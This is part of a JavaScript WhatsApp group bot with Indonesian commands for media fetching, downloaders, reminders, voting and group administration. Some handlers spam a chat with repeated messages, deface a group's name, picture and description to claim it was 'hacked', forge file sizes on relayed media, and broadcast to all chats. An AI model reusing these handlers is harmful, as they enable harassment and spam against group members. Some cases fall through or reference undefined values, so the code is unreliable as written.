huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/japan?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
KonX.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'cecanthailand':

huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/thailand?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
KonX.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break

case 'random':
if (!isGroup) return reply(mess.only.group)
reply(mess.wait)
kau = (`https://hardianto-chan.herokuapp.com/api/asupan?apikey=hardianto`)
kon = await getBuffer(kau)
KonX.sendMessage(from, kon, video, { quoted: mek, thumbnail: fs.readFileSync('./stik/oksip.jpeg')})
break
      // Promote Members
      case "promote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        KonX.groupMakeAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes promote`;
        KonX.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      case "closegc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        KonX.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  KonX.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  KonX.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await KonX.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  KonX.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await KonX.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  KonX.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await KonX.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  KonX.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
      case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        KonX.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "opengc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        KonX.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await KonX.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              KonX.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await KonX.downloadAndSaveMediaMessage(encmedia);
          await KonX.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              KonX.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              KonX.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await KonX.downloadAndSaveMediaMessage(encmedia);
          await KonX.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              KonX.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await KonX.downloadAndSaveMediaMessage(encmedia);
          await KonX.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              KonX.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              KonX.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
case 'hacked':
  if (!mek.key.fromMe) return;
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/7tHCpbg/STK-20211214-WA0641.webp`)
                   KonX.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                KonX.groupUpdateSubject(from, `Naufal Botz By Ridho`)
                await sleep(1000)
                KonX.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_\naowkwowk gk bisa di hapus ya??🗿`)             
                await sleep(1000)
                KonX.sendMessage(from, 'Succes Hacked', text, {quoted: fyt})
case 'mygithub':
  reply('https://github.com/naufal')
					break;
   case 'web':
      reply(mess.wait)
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`, `Ni Kak`)
					break
case 'harta':
  reply(mess.wait)
  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/chartatahta?text=${args[0]}&apikey=${HunterApi}`, `Ni 🗿`)
  break
case 'bocil':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=${dapapi}`)
                    kodo = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, kodo, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case '+62':
                    get_result = await getBuffer(`https://KonX.herokuapp.com/api/asupan?apikey=${valkey}`)
                    pll = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, pll, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'santuy':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupansantuy?apikey=${dapapi}`)
                    hhh = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, hhh, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break 
case 'ukhti':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanukhty?apikey=${dapapi}`)
                    kntl = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, kntl, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'rikagusriani':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanrikagusriani?apikey=${dapapi}`)
                    yyy = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, yyy, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'ghea':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanghea?apikey=${dapapi}`)
                    ggg = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, ggg, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await KonX.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:fgif})
KonX.relayWAMessage(costick)
break

case 'sizeimg':
if (args.length < 1) return reply('Masukan angkanya')
filsizei = args[0]
costick3 = await KonX.prepareMessageFromContent(from,{
"imageMessage": {
	"url": m.quoted.url,
	"mimetype": m.quoted.mimetype,
	"caption": m.quoted.caption,
	"fileSha256": m.quoted.fileSha256.toString('base64'),
	"fileLength": filsizei,
	"height": m.quoted.height,
	"width": m.quoted.width,
	"mediaKey": m.quoted.mediaKey.low,
	"jpegThumbnail": m.quoted.jpegThumbnail
}
}, {quoted:ftroli})
KonX.relayWAMessage(costick3)
break
      case "jadibot":
        if (!mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, KonX, from);
        break;
      case "stopjadibot":
        if (!mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;

      //------------------< Fitur yg pake button >-------------------
      
	case 'chat':
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            KonX.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
case 'viewonce':
res = await KonX.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": iye,
"viewOnce": true
}
}
}
}, {}) 
KonX.relayWAMessage(res)
break
case 'hbd': case 'zodiak': case 'zodiac':
let textus = args.join(" ")
if (!q) return reply(`Example : ${prefix + command} 2003 01 24`)
const zodiak = [
    ["Capricorn",   new Date(1970, 0, 1)],
    ["Aquarius",    new Date(1970, 0, 20)],
    ["Pisces",      new Date(1970, 1, 19)],
    ["Aries",       new Date(1970, 2, 21)],
    ["Taurus",      new Date(1970, 3, 21)],
    ["Gemini",      new Date(1970, 4, 21)],
    ["Cancer",      new Date(1970, 5, 22)],
    ["Leo",         new Date(1970, 6, 23)],
    ["Virgo",       new Date(1970, 7, 23)],
    ["Libra",       new Date(1970, 8, 23)],
    ["Scorpio",     new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn",   new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const okbg = new Date(textus)
if (okbg == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [okbg.getFullYear(), okbg.getMonth() + 1, okbg.getDate()]
    
const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
reply(monospace(teksh))
break
// debug
  case 'debug':
			 res = await KonX.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
							"hydratedFooterText": `${fakeyoi}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
KonX.relayWAMessage(res)
break
case 'debug2':
   res = await KonX.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
    "hydratedFooterText": `${fakeyoi}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${fakeyoi}`,
          "url": "https://github.com/itsme.alya"
        },
        "index": 0
      }
    ]
  }
}
}, {})
KonX.relayWAMessage(res)
break
			
              
                 break
			      case "mode":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan": // by KonX
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya Kak✨`, [
          {
            buttonId: `${prefix}+62`,
            buttonText: {
              displayText: `🍃 Asupan +62`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ghea`,
            buttonText: {
              displayText: `🔖 Asupan Ghea`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}asupan2`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan2": // by KonX
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.2 kak✨`, [
          {
            buttonId: `${prefix}santuy`,
            buttonText: {
              displayText: `🔖 Asupan Santuy`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}bocil`,
            buttonText: {
              displayText: `🔖 Asupan Bocil`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}asupan3`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan3": // by KonX
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.3 kak✨`, [
          {
            buttonId: `${prefix}rikagusriani`,
            buttonText: {
              displayText: `🔖 Asupan Rikagusriani`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ukhti`,
            buttonText: {
              displayText: `🔖 Asupan Ukhti`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}mygithub`,
            buttonText: {
              displayText: `Follow Kak Github Saya😄`,
            },
            type: 1,
          },
        ]);
        break;
      case "grup":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}opengc`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}closegc`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;
      //end
      //------------------< Fitur downloader >-------------------
      case "tiktok":
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${args[0]}`
        );
        var b = bv.result.author_metadata;
        var tamnel = await getBuffer(
          bv.result.media_resources.image.contentUrl
        );
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `⚜️ *Nickname*: ${b.username}\n❤️ *Like*: ${a.stats.diggCount}\n💬 *Komentar*: ${a.stats.commentCount}\n🔁 *Share*: ${a.stats.shareCount}\n🎞️ *Views*: ${a.stats.playCount}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|audio`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;

     
      //JCCHCCGHTHDTRSRS
      case "twitter":
        if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, "DONE");
        break;
      case "facebook":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              KonX.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              KonX.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "tiktokdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break;
case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
           if (c === 'multi'){
              multi = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
                }
                break
      
      case "delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*「 _LINK WA_ 」*\n\n";
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
     /* case "igstalk":
        if (!q) return reply("Usernamenya?");
        const tod = await fetchJson(
          `https://api.dhnjing.xyz/stalk/instagram?user=${q}`
        );
        buff = await getBuffer(tod.result.user_profile_hd);
        const tt = `*INSTAGRAM STALK*
    Username: ${tod.result.username}
    Fullname: ${tod.result.user_fullname}
    Bio: ${tod.result.user_bio}

    Jumlah postingan: ${tod.result.user_post_total}
    Following: ${tod.result.user_following}
    Follower: ${tod.result.user_followers}`;
        KonX.sendMessage(from, buff, image, { quoted: mek, caption: tt });
        break;*/
      
      case "tiktokstalk":
        if (!q) return reply("Usernamenya? ");
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        KonX.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
   
  case 'nuliskiri':            
            if (args.length == 0) return reply(`contoh: ${prefix + command} Vall`)
            reply(mess.wait)
            teks = args.join(" ")
            ini_buf = await getBuffer(`https://KonX.herokuapp.com/api/maker/nulis?apikey=${valkey}&text=${teks}`)  
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(ini_buf, "imageMessage", { thumbnail: ini_buf, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺  シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              KonX.relayWAMessage(prep)
         
            break
		case 'nulis':
              
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dpuhy = args.join(' ')
               tiyo = `SILAHKAN PILIH SALAH SATU`
sendButMessage(from, tiyo, `𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎`, [
            {              
              buttonId: `${prefix}nuliskanan ${dpuhy}`,
              buttonText: {
                displayText: `KANAN`,
              },
              type: 1,
               },
          {
            buttonId: `${prefix}nuliskiri ${dpuhy}`,
            buttonText: {
              displayText: `KIRI`,
            },
            type: 1,          
          },
        ]);               
        break;
        case 'tobc':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				KonX.updatePresence(from, Presence.composing)
					anu = await KonX.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await KonX.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							KonX.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await KonX.downloadMediaMessage(encmedia)
						for (let _ of anu) {
